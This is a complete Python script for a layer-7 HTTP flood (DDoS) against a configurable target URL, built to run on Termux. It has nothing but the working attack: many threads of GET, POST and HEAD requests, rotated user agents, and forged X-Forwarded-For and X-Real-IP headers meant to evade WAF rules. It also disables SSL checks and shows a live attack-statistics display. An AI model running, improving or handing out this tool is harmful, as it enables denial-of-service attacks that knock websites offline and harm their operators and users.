#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Layer7 HTTP Flood - Termux Compatible
# Requires: pip install requests colorama

import requests
import threading
import random
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# === COLORAMA SETUP ===
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except:
    GREEN = RED = YELLOW = CYAN = RESET = ""

# === CONFIGURATION ===
TARGET_URL = "http://example.com"  # Change to target URL
THREAD_COUNT = 200                 # Number of threads
DURATION = 300                     # Duration in seconds
TIMEOUT = 10                       # Request timeout
RETRY_COUNT = 3                    # Max retries per request

# === USER AGENT POOL ===
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.169 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; arm_64; Android 13; Nothing Phone 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.193 Mobile Safari/537.36"
]

# === HTTP METHOD PAYLOADS ===
def get_random_headers():
    """Generate randomized headers to bypass basic WAF rules"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8", "en-GB,en;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://www.facebook.com/",
            "https://twitter.com/"
        ])
    }
    return headers

def get_random_params():
    """Generate random query parameters"""
    params = {
        "q": str(random.randint(10000, 99999)),
        "page": str(random.randint(1, 50)),
        "id": str(random.randint(1, 9999)),
        "ref": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
        "token": ''.join(random.choices('abcdef0123456789', k=32)),
        "t": str(int(time.time() * 1000))
    }
    return params

# === ATTACK FUNCTIONS ===
def http_get_flood(session):
    """HTTP GET flood with randomized parameters"""
    try:
        url = TARGET_URL
        if "?" not in url:
            url += "?" + "&".join([f"{k}={v}" for k, v in get_random_params().items()])
        response = session.get(url, headers=get_random_headers(), timeout=TIMEOUT, allow_redirects=False)
        return response.status_code
    except:
        return None

def http_post_flood(session):
    """HTTP POST flood with randomized body"""
    try:
        post_data = {
            "username": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12))),
            "password": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(8, 16))),
            "email": f"{random.choice(['user','admin','test'])}{random.randint(100,999)}@{random.choice(['gmail','yahoo','outlook'])}.com"
        }
        response = session.post(TARGET_URL, headers=get_random_headers(), data=post_data, timeout=TIMEOUT, allow_redirects=False)
        return response.status_code
    except:
        return None

def mixed_attack(thread_id):
    """Individual thread execution mixing GET and POST methods"""
    session = requests.Session()
    session.verify = False
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    end_time = time.time() + DURATION
    request_count = 0
    error_count = 0
    
    while time.time() < end_time:
        try:
            method_choice = random.randint(1, 3)
            
            if method_choice == 1:
                status = http_get_flood(session)
            elif method_choice == 2:
                status = http_post_flood(session)
            else:
                # HEAD request
                session.head(TARGET_URL, headers=get_random_headers(), timeout=TIMEOUT)
                status = 200
            
            if status:
                request_count += 1
                if status == 200 or status == 403 or status == 429:
                    pass
                else:
                    error_count += 1
            else:
                error_count += 1
                
            # Dynamic sleep based on success rate
            if error_count > request_count * 0.5:
                time.sleep(random.uniform(0.05, 0.1))
            else:
                time.sleep(random.uniform(0.001, 0.01))
                
        except KeyboardInterrupt:
            break
        except:
            error_count += 1
            time.sleep(0.1)
    
    return thread_id, request_count, error_count

# === STATISTICS DISPLAY ===
def display_stats(start_time, completed, total, requests_sent):
    """Display real-time attack statistics"""
    elapsed = time.time() - start_time
    if elapsed > 0:
        rps = requests_sent / elapsed
        progress = (completed / total) * 100 if total > 0 else 0
        
        sys.stdout.write(f"\r{CYAN}[*] {GREEN}Threads: {completed}/{total} {YELLOW}| {GREEN}RPS: {rps:.1f} {YELLOW}| {GREEN}Elapsed: {elapsed:.0f}s {YELLOW}| {GREEN}Progress: {progress:.1f}%{RESET}")
        sys.stdout.flush()

# === MAIN FUNCTION ===
def main():
    """Main attack orchestrator"""
    # Clear screen Termux style
    os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
    
    # Banner
    banner = f"""
{CYAN}╔═══════════════════════════════════════════╗
║   {RED}Layer7 DDoS - Termux Edition v2.0    {CYAN}║
╠═══════════════════════════════════════════╣
║  {YELLOW}Target: {GREEN}{TARGET_URL}{' ' * (27 - len(TARGET_URL))}{CYAN}║
║  {YELLOW}Threads: {GREEN}{THREAD_COUNT}{' ' * (27 - len(str(THREAD_COUNT)))}{CYAN}║
║  {YELLOW}Duration: {GREEN}{DURATION}s{' ' * (23 - len(str(DURATION)))}{CYAN}║
{CYAN}╚═══════════════════════════════════════════╝{RESET}
"""
    print(banner)
    
    print(f"{GREEN}[+] Starting attack threads...{RESET}")
    print(f"{YELLOW}[!] Press CTRL+C to stop{RESET}\n")
    
    start_time = time.time()
    total_requests = 0
    total_errors = 0
    
    try:
        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = {executor.submit(mixed_attack, i): i for i in range(THREAD_COUNT)}
            
            completed = 0
            for future in as_completed(futures):
                try:
                    thread_id, reqs, errs = future.result()
                    total_requests += reqs
                    total_errors += errs
                    completed += 1
                    display_stats(start_time, completed, THREAD_COUNT, total_requests)
                except:
                    completed += 1
            
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Attack interrupted by user{RESET}")
    
    finally:
        elapsed = time.time() - start_time
        print(f"\n\n{GREEN}[+] Attack Summary:{RESET}")
        print(f"{CYAN}    Duration: {elapsed:.1f}s{RESET}")
        print(f"{CYAN}    Total Requests: {total_requests}{RESET}")
        print(f"{CYAN}    Requests/sec: {total_requests/elapsed:.1f}{RESET}")
        print(f"{CYAN}    Errors: {total_errors}{RESET}")
        print(f"{YELLOW}[*] Attack complete.{RESET}")

# === ENTRY POINT ===
if __name__ == "__main__":
    # Termux permission check
    if "termux" in os.environ.get('PREFIX', ''):
        print(f"{YELLOW}[*] Termux detected - optimizing for mobile{RESET}")
        THREAD_COUNT = min(THREAD_COUNT, 300)  # Limit threads for mobile
        print(f"{YELLOW}[*] Thread count adjusted to {THREAD_COUNT} for stability{RESET}")
    
    main()
